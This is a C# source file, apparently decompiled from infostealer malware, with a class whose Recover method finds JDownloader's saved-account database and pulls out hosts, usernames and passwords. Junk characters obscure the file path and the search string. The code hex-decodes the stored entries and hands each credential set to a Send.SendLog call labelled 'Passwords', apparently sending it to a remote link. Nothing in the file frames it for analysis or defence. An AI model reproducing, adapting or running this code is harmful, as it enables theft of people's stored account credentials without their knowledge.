using System.IO;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class JDownloader
{
	public static void Recover()
	{
		string text = null;
		string host = null;
		string text2 = null;
		string text3 = null;
		new StringBuilder();
		string path = ((Interaction.Environ("Programfiles(x86)") != null) ? (Interaction.Environ("programfiles(x86)") + "$\\jD$ownloader\\con$fig\\databa$se.sc$ript".Replace("$", "")) : (Interaction.Environ("programfiles") + "$\\jDow$nloader\\$config\\dat$abase.scr$ipt".Replace("$", "")));
		if (!File.Exists(path))
		{
			return;
		}
		string text4 = "#INS#ERT INT#O CON#FIG VA#LUE#S('A#ccoun#tContr#oller#','".Replace("#", null);
		string[] array = File.ReadAllLines(path);
		checked
		{
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				if (!array[i].Contains(text4))
				{
					continue;
				}
				string text5 = array[i].Substring(text4.Length - 1).Substring(1, array[i].Length - (text4.Length + 1 + 3));
				int num2 = text5.Length - 1;
				for (int j = 0; j <= num2; j += 2)
				{
					text += Conversions.ToString(Strings.Chr(Conversions.ToInteger("&H" + text5.Substring(j, 2))));
				}
				text5 = "";
				string[] array2 = text.Split(new char[1] { '\0' });
				int num3 = array2.Length - 1;
				for (int k = 0; k <= num3; k++)
				{
					int num4 = 1;
					do
					{
						array2[k] = array2[k].Replace(Conversions.ToString(Strings.Chr(num4)), "");
						num4++;
					}
					while (num4 <= 31);
					array2[k] = array2[k].Replace("ÿ", "");
					if (Operators.CompareString(array2[k], "", false) != 0)
					{
						text5 = text5 + "\r\n" + array2[k];
					}
				}
				string[] array3 = text5.ToString().Split(new char[1] { '\r' });
				int num5 = array3.Length - 2;
				for (int l = 0; l <= num5; l++)
				{
					if (array3[l].EndsWith("sq") & (array3[l].IndexOf(".") > 0))
					{
						host = array3[l].Substring(0, array3[l].Length - 2);
					}
					if (array3[l].EndsWith("t") & array3[l + 1].EndsWith("xt"))
					{
						text3 = array3[l].Substring(0, array3[l].Length - 1);
						text2 = array3[l + 1].Substring(0, array3[l + 1].Length - 2);
						Send.SendLog(Camera.P_Link, "Passwords", null, null, "JDownloader", host, text2, text3, null);
					}
				}
			}
		}
	}
}
